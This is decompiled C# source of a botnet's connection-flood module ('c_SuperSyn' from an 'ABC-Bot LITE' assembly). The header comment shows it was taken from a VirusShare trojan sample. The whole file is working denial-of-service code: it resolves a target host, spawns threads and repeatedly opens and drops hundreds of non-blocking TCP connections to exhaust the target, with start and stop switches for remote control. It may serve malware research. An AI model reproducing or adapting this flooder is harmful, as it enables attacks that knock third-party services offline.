// Decompiled with JetBrains decompiler
// Type: ABC_Bot.c_SuperSyn
// Assembly: ABC-Bot LITE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C2CB4D60-1596-4A45-B5DE-4321788ED925
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00013-msil\Trojan-Ransom.Win32.PornoAsset.dcuv-d1ed6a70bd98b6cb5a8ec8bbe82d1c3bba1c7350bcb75c8ff99b6551438069fc.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ABC_Bot
{
  internal class c_SuperSyn
  {
    private static ThreadStart[] _floodingJob;
    private static Thread[] _floodingThread;
    private static IPEndPoint _ipEo;
    private static c_SuperSyn.SendSyn[] _synClass;
    public static string Host;
    public static bool IsEnabled;
    public static int Port = 80;
    public static int SuperSynSockets = 200;
    public static int Threads = 5;

    [DebuggerNonUserCode]
    public c_SuperSyn()
    {
    }

    public static void StartSuperSyn()
    {
      try
      {
        c_SuperSyn._ipEo = new IPEndPoint(Dns.GetHostEntry(c_SuperSyn.Host).AddressList[0], c_SuperSyn.Port);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        c_SuperSyn._ipEo = new IPEndPoint(IPAddress.Parse(c_SuperSyn.Host), c_SuperSyn.Port);
        ProjectData.ClearProjectError();
      }
      c_SuperSyn._floodingThread = new Thread[checked (c_SuperSyn.Threads - 1 + 1)];
      c_SuperSyn._floodingJob = new ThreadStart[checked (c_SuperSyn.Threads - 1 + 1)];
      c_SuperSyn._synClass = new c_SuperSyn.SendSyn[checked (c_SuperSyn.Threads - 1 + 1)];
      try
      {
        int num = checked (c_SuperSyn.Threads - 1);
        int index = 0;
        while (index <= num)
        {
          c_SuperSyn._synClass[index] = new c_SuperSyn.SendSyn(c_SuperSyn._ipEo, c_SuperSyn.SuperSynSockets);
          c_SuperSyn._floodingJob[index] = new ThreadStart(c_SuperSyn._synClass[index].Send);
          c_SuperSyn._floodingThread[index] = new Thread(c_SuperSyn._floodingJob[index]);
          c_SuperSyn._floodingThread[index].Start();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      c_SuperSyn.IsEnabled = true;
    }

    public static void StopSuperSyn()
    {
      int num = checked (c_SuperSyn.Threads - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          c_SuperSyn._floodingThread[index].Abort();
          c_SuperSyn._floodingThread[index] = (Thread) null;
          c_SuperSyn._floodingJob[index] = (ThreadStart) null;
          c_SuperSyn._synClass[index] = (c_SuperSyn.SendSyn) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      c_SuperSyn.IsEnabled = false;
    }

    private class SendSyn
    {
      private Socket[] _sock;
      private IPEndPoint ipEo;
      private int SuperSynSockets;

      public SendSyn(IPEndPoint ipEo, int superSynSockets__1)
      {
        this.ipEo = ipEo;
        this.SuperSynSockets = superSynSockets__1;
      }

      private static void OnConnect(IAsyncResult ar)
      {
      }

      public void Send()
      {
        while (c_SuperSyn.IsEnabled)
        {
          try
          {
            this._sock = new Socket[checked (this.SuperSynSockets - 1 + 1)];
            int num1 = checked (this.SuperSynSockets - 1);
            int index1 = 0;
            while (index1 <= num1)
            {
              this._sock[index1] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
              this._sock[index1].Blocking = false;
              this._sock[index1].BeginConnect((EndPoint) this.ipEo, new AsyncCallback(c_SuperSyn.SendSyn.OnConnect), (object) this._sock[index1]);
              checked { ++index1; }
            }
            Thread.Sleep(100);
            int num2 = checked (this.SuperSynSockets - 1);
            int index2 = 0;
            while (index2 <= num2)
            {
              if (this._sock[index2].Connected)
                this._sock[index2].Disconnect(false);
              this._sock[index2].Close();
              this._sock[index2] = (Socket) null;
              checked { ++index2; }
            }
            this._sock = (Socket[]) null;
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            int num = checked (this.SuperSynSockets - 1);
            int index = 0;
            while (index <= num)
            {
              try
              {
                if (this._sock != null)
                {
                  if (this._sock[index].Connected)
                    this._sock[index].Disconnect(false);
                  this._sock[index].Close();
                  this._sock[index] = (Socket) null;
                }
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                ProjectData.ClearProjectError();
              }
              checked { ++index; }
            }
            ProjectData.ClearProjectError();
          }
        }
      }
    }
  }
}
